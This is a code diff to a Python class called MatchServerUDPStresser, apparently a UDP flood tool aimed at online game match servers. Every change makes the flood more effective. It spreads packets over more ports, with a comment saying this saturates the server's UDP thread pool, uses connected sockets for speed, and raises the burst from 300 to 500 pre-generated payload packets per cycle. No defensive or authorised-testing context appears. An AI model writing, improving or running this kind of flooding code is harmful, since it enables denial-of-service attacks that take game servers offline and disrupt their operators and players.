@@ -178,11 +178,11 @@ class MatchServerUDPStresser:
         self._threads_list = []
 
     def _flood_worker(self, stop_time: float):
+        # Expanded Port Jitter Range (Saturates full match server UDP thread pool)
         target_ports = [
-            self.target_port,
-            self.target_port + 1,
-            self.target_port - 1,
-            self.target_port + 2 if self.target_port + 2 < 65535 else self.target_port
+            self.target_port + offset
+            for offset in [0, 1, -1, 2, -2, 3, -3, 4, -4]
+            if 1 <= (self.target_port + offset) <= 65535
         ]
         num_ports = len(target_ports)
 
@@ -191,15 +191,18 @@ class MatchServerUDPStresser:
         idx = random.randint(0, 1000)
 
         while self.is_running and time.time() < stop_time:
-            # High-Throughput Cloud Data Center Socket Pool (Linux High-Performance Sockets)
+            # Create fast connected UDP sockets per batch
             sockets = []
-            for _ in range(3):
+            for i in range(num_ports):
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     try:
                         s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
                     except Exception:
                         pass
+                    # Fast-path connected socket (skips per-packet kernel routing lookup)
+                    t_port = target_ports[i % num_ports]
+                    s.connect((self.target_ip, t_port))
                     sockets.append(s)
                 except Exception:
                     pass
@@ -210,8 +213,8 @@ class MatchServerUDPStresser:
 
             num_sockets = len(sockets)
 
-            # High-Speed Data Center Burst Loop (300 state packets per batch)
-            for _ in range(300):
+            # Ultra High-Speed Send Loop (500 state packets per cycle)
+            for _ in range(500):
                 if not self.is_running:
                     break
                 try:
@@ -219,9 +222,8 @@ class MatchServerUDPStresser:
                     p_idx = idx % NUM_PRE_PAYLOADS
                     payload = PRE_GENERATED_PAYLOADS[p_idx]
                     size = PAYLOAD_SIZES[p_idx]
-                    target = (self.target_ip, target_ports[idx % num_ports])
 
-                    current_sock.sendto(payload, target)
+                    current_sock.send(payload)
                     local_pkts += 1
                     local_bytes += size
                     idx += 1
